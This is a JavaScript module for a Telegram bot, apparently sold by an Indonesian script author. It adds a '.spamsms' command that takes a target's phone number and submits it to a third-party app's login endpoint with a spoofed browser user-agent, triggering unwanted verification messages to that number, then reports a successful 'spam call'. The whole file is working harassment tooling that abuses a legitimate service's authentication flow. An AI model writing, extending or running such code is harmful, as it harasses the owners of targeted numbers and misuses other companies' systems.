/*
  ( Base Ori WannOFFC°GhostMods°GlobalElits )

Script Ini Murni Bikinan Sendiri, Saya Hanya Sekedar Kroco Penghuni Inti Bumi.

Note : 
• Jangan Membagikan Script Ini Secara Free !!
• Jangan Mengganti Name Developer Script !!
• Jangan Menjual Script Ini Di Atas Harga Yang Saya Jual !!

Thanks To :                                
- Allah Swt 
- Nabi Muhammad Saw         
- My Team
- WannOFFC   :   [ My Self ] 
- GlobalElits       [ Support ]
- Ghost       :    [ Support ] 
- Pengguna Bot Yang Selalu Support

• Recode By ( Nama Mu )
*/
const axios = require('axios');
const config = require('../../config');
// Memisahkan URL dan API key ke dalam variabel konfigurasi
const API_KEY = config.apilol;

module.exports = (bot) => {
  bot.onText(/^\.spamsms(?:\s+(\d+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];

    if (!phoneNumber) {
      bot.sendMessage(chatId, 'Masukan nomor yang ingin Anda spamsms, contoh: .spamsms +6285236xxxxxx');
      return;
    }

    
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
    try {
axios.post('https://api.myfave.com/api/fave/v1/auth', phoneNumber, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`spam By YudaMods`);
});


      bot.sendMessage(chatId, `Berhasil melakukan spam call ke nomor ${phoneNumber}.`);
    } catch (error) {
      console.error(error);
      bot.sendMessage(chatId, 'Maaf, terjadi kesalahan dalam melakukan spam call.');
    }
  });
};